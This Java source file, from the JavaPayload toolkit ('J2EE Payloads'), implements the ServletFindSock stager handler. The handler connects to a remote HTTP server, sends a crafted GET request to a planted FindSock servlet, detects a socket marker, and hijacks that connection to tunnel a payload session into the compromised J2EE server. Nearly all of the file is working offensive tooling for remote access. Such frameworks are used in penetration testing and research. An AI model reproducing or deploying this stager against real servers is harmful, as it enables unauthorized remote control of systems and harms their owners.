/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.io.Writer;
import java.net.Socket;
import java.net.URLEncoder;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

public class ServletFindSock extends StagerHandler {

	public ServletFindSock() {
		super("Tunnel the payload stream via a FindSock servlet", true, false, 
				"This stager will connect to a FindSock servlet, which tries to find its own\r\n" +
				"socket that was used to accept the HTTP connection and use it for tunnelling\r\n" +
				"the payload stream.");
	}
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("RHOST", false, Parameter.TYPE_HOST, "HTTP server host"),
				new Parameter("RPORT", false, Parameter.TYPE_HOST, "HTTP server port"),
				new Parameter("PATH", false, Parameter.TYPE_ANY, "Path to the servlet, with leading slash"),				
		};
	}
	
	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (readyHandler != null)
			readyHandler.notifyReady();
		String host = parameters[1];
		Socket sock = new Socket(host, Integer.parseInt(parameters[2]));
		Writer w = new OutputStreamWriter(sock.getOutputStream());
		StringBuffer paramBuf = new StringBuffer();
		for (int i = 0; i < parameters.length; i++) {
			if (i != 0) paramBuf.append(' ');
			paramBuf.append(parameters[i]);
		}
		String params = "?cmd="+URLEncoder.encode(paramBuf.toString(),"UTF-8");
		if (parameters[4].equals("C")) {
			params+="&clone=1";
		} else if (parameters[4].equals("V")) {
			params+="&verbose=1";
		}
		w.write("GET "+parameters[3]+"/jpf"+params+" HTTP/1.0\r\n" +
				"Host: "+host+"\r\n" +
				"Connection: close\r\n\r\n");
		w.flush();
		InputStream in = sock.getInputStream();
		OutputStream out = sock.getOutputStream();
		int b;
		while ((b = in.read()) != -1) {
			if (b == 1) break;
			stageHandler.consoleOut.write(b);
		}
		if (b != 1) {
			stageHandler.consoleOut.println("\nNo socket marker found.");
			stageHandler.consoleOut.close();
			return;
		}
		stageHandler.consoleOut.println("\nEstablishing session...");
		out.write(new byte[] {3});
		out.flush();
		if (in.read() != 2) {
			stageHandler.consoleOut.println("Socket marker corrupted.");
			while ((b = in.read()) != -1) {
				stageHandler.consoleOut.write(b);
			}
			stageHandler.consoleOut.close();
			return;
		}
		stageHandler.consoleOut.println("Starting handler...");
		stageHandler.handle(out, in, parameters);
	}

	protected boolean needHandleBeforeStart() {
		throw new IllegalStateException("No extra handler needed");
	}	
	
	protected String getTestArguments() {
		return null;
	}
}
